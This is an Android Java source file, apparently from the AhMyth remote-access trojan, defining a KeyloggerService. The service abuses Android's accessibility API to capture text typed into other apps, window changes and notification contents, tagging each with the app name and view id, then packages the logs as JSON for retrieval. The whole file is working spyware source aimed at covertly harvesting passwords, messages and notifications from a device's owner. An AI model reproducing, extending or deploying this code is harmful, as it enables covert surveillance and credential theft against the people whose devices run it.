package ahmyth.mine.king.ahmyth;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * KeyloggerService uses AccessibilityService to capture text input
 * Must be enabled in Settings > Accessibility
 */
public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";
    private static final int MAX_LOG_ENTRIES = 1000;
    
    private static KeyloggerService instance;
    private static List<KeylogEntry> keylogEntries = new ArrayList<>();
    private static boolean isEnabled = false;
    
    private String currentPackage = "";
    private String lastText = "";
    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
    
    public static KeyloggerService getInstance() {
        return instance;
    }
    
    public static boolean isServiceEnabled() {
        return isEnabled && instance != null;
    }
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        // Register with InputManager for gesture dispatch
        InputManager.setAccessibilityService(this);
        Log.d(TAG, "KeyloggerService created");
    }
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        isEnabled = true;
        // Ensure InputManager has reference
        InputManager.setAccessibilityService(this);
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        }
        
        setServiceInfo(info);
        Log.d(TAG, "KeyloggerService connected");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        
        try {
            CharSequence packageName = event.getPackageName();
            if (packageName != null) {
                currentPackage = packageName.toString();
            }
            
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowChanged(event);
                    break;
                    
                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    handleNotification(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing event", e);
        }
    }
    
    private void handleTextChanged(AccessibilityEvent event) {
        CharSequence text = event.getText() != null && !event.getText().isEmpty() 
            ? event.getText().get(0) : null;
        
        if (text != null && text.length() > 0) {
            String newText = text.toString();
            
            // Only log if different from last text
            if (!newText.equals(lastText)) {
                addEntry("TEXT", currentPackage, newText, getViewId(event));
                lastText = newText;
            }
        }
    }
    
    private void handleWindowChanged(AccessibilityEvent event) {
        CharSequence className = event.getClassName();
        if (className != null) {
            addEntry("WINDOW", currentPackage, className.toString(), "");
        }
    }
    
    private void handleNotification(AccessibilityEvent event) {
        CharSequence text = event.getText() != null && !event.getText().isEmpty() 
            ? event.getText().get(0) : null;
        
        if (text != null) {
            addEntry("NOTIFICATION", currentPackage, text.toString(), "");
        }
    }
    
    private String getViewId(AccessibilityEvent event) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            if (event.getSource() != null && event.getSource().getViewIdResourceName() != null) {
                return event.getSource().getViewIdResourceName();
            }
        }
        return "";
    }
    
    private void addEntry(String type, String app, String content, String viewId) {
        KeylogEntry entry = new KeylogEntry(type, app, content, viewId);
        
        synchronized (keylogEntries) {
            keylogEntries.add(entry);
            
            // Limit entries to prevent memory issues
            while (keylogEntries.size() > MAX_LOG_ENTRIES) {
                keylogEntries.remove(0);
            }
        }
        
        Log.d(TAG, "Keylog: [" + type + "] " + app + " - " + content);
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "KeyloggerService interrupted");
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        isEnabled = false;
        Log.d(TAG, "KeyloggerService destroyed");
    }
    
    /**
     * Get all keylog entries as JSON
     */
    public static JSONObject getKeylogs() {
        JSONObject result = new JSONObject();
        JSONArray logsArray = new JSONArray();
        
        try {
            synchronized (keylogEntries) {
                for (KeylogEntry entry : keylogEntries) {
                    logsArray.put(entry.toJSON());
                }
            }
            
            result.put("enabled", isEnabled);
            result.put("count", logsArray.length());
            result.put("logs", logsArray);
            
        } catch (JSONException e) {
            Log.e(TAG, "Error creating keylog JSON", e);
        }
        
        return result;
    }
    
    /**
     * Clear all keylog entries
     */
    public static void clearLogs() {
        synchronized (keylogEntries) {
            keylogEntries.clear();
        }
        Log.d(TAG, "Keylogs cleared");
    }
    
    /**
     * Get keylog count
     */
    public static int getLogCount() {
        synchronized (keylogEntries) {
            return keylogEntries.size();
        }
    }
    
    /**
     * Inner class for keylog entries
     */
    private static class KeylogEntry {
        String type;
        String app;
        String content;
        String viewId;
        long timestamp;
        
        KeylogEntry(String type, String app, String content, String viewId) {
            this.type = type;
            this.app = app;
            this.content = content;
            this.viewId = viewId;
            this.timestamp = System.currentTimeMillis();
        }
        
        JSONObject toJSON() {
            JSONObject obj = new JSONObject();
            try {
                obj.put("type", type);
                obj.put("app", app);
                obj.put("content", content);
                obj.put("viewId", viewId);
                obj.put("timestamp", timestamp);
            } catch (JSONException e) {
                Log.e(TAG, "Error converting entry to JSON", e);
            }
            return obj;
        }
    }
}

